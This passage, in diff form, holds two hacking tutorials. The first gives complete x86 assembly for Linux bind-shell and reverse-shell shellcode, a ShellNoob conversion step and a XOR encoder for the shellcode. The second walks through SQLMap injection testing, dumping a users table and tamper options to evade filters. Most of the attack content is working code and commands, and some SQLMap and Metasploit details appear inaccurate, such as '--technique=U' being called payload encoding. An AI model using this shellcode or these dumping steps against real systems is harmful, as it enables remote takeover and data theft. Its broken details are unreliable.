+    mov ecx, esp
+    push 0x10
+    push ecx
+    push ebx
+    push eax
+    mov al, 0x66
+    int 0x80
+
+    ; listen(sockfd, 1)
+    xor eax, eax
+    push eax
+    push 0x1
+    pop ecx
+    push ebx
+    push eax
+    mov al, 0x66
+    int 0x80
+
+    ; accept(sockfd, (struct sockaddr *)NULL, NULL)
+    xor eax, eax
+    push eax
+    push ebx
+    mov ecx, esp
+    push ebx
+    push ecx
+    mov al, 0x66
+    int 0x80
+
+    ; dup2(newsockfd, 0)
+    xchg eax, ebx
+    xor ecx, ecx
+dup2_loop:
+    mov al, 0x3f
+    int 0x80
+    inc ecx
+    cmp ecx, 0x2
+    jle dup2_loop
+
+    ; execve("/bin/sh", NULL, NULL)
+    xor eax, eax
+    push eax
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    push eax
+    push ebx
+    mov ecx, esp
+    mov al, 0xb
+    int 0x80
+```
+
+2. **Convert the assembly code to shellcode:**
+
+```bash
+shellnoob -f bind.asm
+```
+
+The output will be the shellcode that creates a bind shell on port 4444 (0x5c11 in little-endian).
+
+### Example 2: Creating Reverse Shell
+
+A reverse shell connects back to the attacker's machine.
+
+1. **Create a file `reverse.asm` with the following content:**
+
+```assembly
+section .text
+global _start
+
+_start:
+    ; socket(AF_INET, SOCK_STREAM, 0)
+    xor eax, eax
+    push eax
+    push 0x66
+    pop eax
+    push 0x1
+    pop ebx
+    push 0x2
+    pop ecx
+    int 0x80
+
+    ; connect(sockfd, (struct sockaddr *)&addr, sizeof(addr))
+    xchg eax, ebx
+    xor eax, eax
+    push eax
+    push dword 0x0100007f
+    push word 0x5c11
+    push word 0x2
+    mov ecx, esp
+    push 0x10
+    push ecx
+    push ebx
+    push eax
+    mov al, 0x66
+    int 0x80
+
+    ; dup2(sockfd, 0)
+    xor ecx, ecx
+dup2_loop:
+    mov al, 0x3f
+    int 0x80
+    inc ecx
+    cmp ecx, 0x2
+    jle dup2_loop
+
+    ; execve("/bin/sh", NULL, NULL)
+    xor eax, eax
+    push eax
+    push 0x68732f2f
+    push 0x6e69622f
+    mov ebx, esp
+    push eax
+    push ebx
+    mov ecx, esp
+    mov al, 0xb
+    int 0x80
+```
+
+2. **Convert the assembly code to shellcode:**
+
+```bash
+shellnoob -f reverse.asm
+```
+
+The output will be the shellcode that creates a reverse shell connecting to 127.0.0.1 on port 4444.
+
+## Advanced Usage
+
+ShellNoob offers advanced features for experienced users.
+
+### Example: Custom Encoders
+
+You can create custom encoders for your shellcode.
+
+1. **Create a custom encoder file `encoder.py`:**
+
+```python
+def encode(shellcode):
+    encoded = ""
+    for byte in bytearray(shellcode):
+        encoded += "\\x%02x" % (byte ^ 0xaa)
+    return encoded
+```
+
+2. **Use the custom encoder with ShellNoob:**
+
+```
+
+bash
+shellnoob -f shell.asm -E encoder.py
+```
+
+This command will encode the shellcode using the custom XOR encoder defined in `encoder.py`.
+
+## Conclusion
+
+ShellNoob is a versatile tool that simplifies the process of shellcode development. By mastering its features, you can streamline your workflow and create more effective shellcode. This tutorial covered the basics, advanced usage, and practical examples to help you get started and advance your skills. Practice and experimentation will further enhance your proficiency with ShellNoob.
+
+# SQLMap Tutorial
+
+## Introduction
+
+SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws and taking over database servers. This tutorial will guide you through everything you need to master SQLMap, from basic usage to advanced exploitation techniques.
+
+### Table of Contents
+
+1. [Installation](#installation)
+2. [Basic Usage](#basic-usage)
+3. [Advanced Options](#advanced-options)
+4. [Dumping Databases](#dumping-databases)
+5. [Real-World Examples](#real-world-examples)
+6. [Bypassing Filters](#bypassing-filters)
+7. [Using SQLMap with Other Tools](#using-sqlmap-with-other-tools)
+8. [Best Practices and Legal Considerations](#best-practices-and-legal-considerations)
+
+## Installation
+
+To install SQLMap, you can use the following commands on different operating systems:
+
+### Windows
+
+1. Download the latest version from the official [SQLMap GitHub repository](https://github.com/sqlmapproject/sqlmap).
+2. Extract the downloaded archive.
+3. Navigate to the extracted folder and run `sqlmap.py` with Python.
+
+```sh
+python sqlmap.py
+```
+
+### Linux/MacOS
+
+1. Open your terminal.
+2. Use git to clone the repository:
+
+```sh
+git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
+```
+
+3. Navigate to the sqlmap-dev directory:
+
+```sh
+cd sqlmap-dev
+```
+
+4. Run `sqlmap.py`:
+
+```sh
+python3 sqlmap.py
+```
+
+## Basic Usage
+
+### Finding SQL Injection Vulnerabilities
+
+To begin using SQLMap, you need a URL that might be vulnerable to SQL injection. Here's a basic command to test a URL:
+
+```sh
+python3 sqlmap.py -u "http://example.com/vulnerable.php?id=1"
+```
+
+This command tells SQLMap to test the specified URL for SQL injection vulnerabilities.
+
+### Basic Options
+
+- `-u <URL>`: Specifies the target URL.
+- `--dbs`: Lists all databases.
+- `-D <database> --tables`: Lists all tables in the specified database.
+- `-D <database> -T <table> --columns`: Lists all columns in the specified table.
+- `-D <database> -T <table> -C <column> --dump`: Dumps the data from the specified column.
+
+### Example: Listing Databases
+
+```sh
+python3 sqlmap.py -u "http://example.com/vulnerable.php?id=1" --dbs
+```
+
+This command will list all the databases available on the target system.
+
+## Advanced Options
+
+### Authentication
+
+If the target website requires authentication, you can provide SQLMap with the necessary cookies:
+
+```sh
+python3 sqlmap.py -u "http://example.com/vulnerable.php?id=1" --cookie="PHPSESSID=abcd1234"
+```
+
+### Proxy Support
+
+To use a proxy:
+
+```sh
+python3 sqlmap.py -u "http://example.com/vulnerable.php?id=1" --proxy="http://127.0.0.1:8080"
+```
+
+### Specifying Database Management System
+
+If you know the target database management system, specify it to speed up the process:
+
+```sh
+python3 sqlmap.py -u "http://example.com/vulnerable.php?id=1" --dbms=mysql
+```
+
+## Dumping Databases
+
+Once you've found a vulnerable URL, you can start extracting data.
+
+### Example: Dumping a Table
+
+1. List databases:
+
+```sh
+python3 sqlmap.py -u "http://example.com/vulnerable.php?id=1" --dbs
+```
+
+2. List tables in a specific database:
+
+```sh
+python3 sqlmap.py -u "http://example.com/vulnerable.php?id=1" -D exampledb --tables
+```
+
+3. List columns in a specific table:
+
+```sh
+python3 sqlmap.py -u "http://example.com/vulnerable.php?id=1" -D exampledb -T users --columns
+```
+
+4. Dump the data:
+
+```sh
+python3 sqlmap.py -u "http://example.com/vulnerable.php?id=1" -D exampledb -T users --dump
+```
+
+## Real-World Examples
+
+### Example 1: Exploiting a GET Parameter
+
+```sh
+python3 sqlmap.py -u "http://example.com/products.php?id=2" --dbs
+```
+
+### Example 2: Exploiting a POST Parameter
+
+1. Create a data file (data.txt) with the POST parameters:
+
+```
+username=admin&password=password
+```
+
+2. Use SQLMap with the `--data` option:
+
+```sh
+python3 sqlmap.py -u "http://example.com/login.php" --data="username=admin&password=password" --dbs
+```
+
+### Example 3: Using SQLMap with Burp Suite
+
+1. Capture the request with Burp Suite.
+2. Save the request to a file (request.txt).
+3. Use SQLMap with the `-r` option:
+
+```sh
+python3 sqlmap.py -r request.txt --dbs
+```
+
+## Bypassing Filters
+
+### Tamper Scripts
+
+SQLMap includes several tamper scripts to help bypass filters:
+
+```sh
+python3 sqlmap.py -u "http://example.com/vulnerable.php?id=1" --tamper="between,randomcase"
+```
+
+### Encoding Payloads
+
+You can encode the payloads to evade detection:
+
+```sh
+python3 sqlmap.py -u "http://example.com/vulnerable.php?id=1" --technique=U
+```
+
+## Using SQLMap with Other Tools
+
+### Integrating with Metasploit
+
+1. Export the database data to a file:
+
+```sh
+python3 sqlmap.py -u "http://example.com/vulnerable.php?id=1" --dump --output-dir=output
+```
+
+2. Import the data into Metasploit:
+
+```sh
+msfconsole
+use auxiliary/scanner/http/sqlmap
+set RHOSTS example.com
+set THREADS 10
+run
+```
+
+## Best Practices and Legal Considerations
+
+### Ethical Hacking
+
+Always obtain explicit permission before testing any system. Unauthorized access is illegal and unethical.
+
+### Keeping SQLMap Updated
+
+Regularly update SQLMap to ensure you have the latest features and security patches:
+
+```sh
+cd sqlmap-dev
+git pull
+```
+
+## Conclusion
+
+Mastering SQLMap involves understanding its various options and how to apply them effectively. Practice on legal targets such as [DVWA](http://www.dvwa.co.uk/) or [bWAPP](http://www.itsecgames.com/) to hone your skills.
+
+Remember, with great power comes great responsibility. Use your skills ethically and legally.
+
+---
+
+Feel free to ask if you need more details or specific examples!
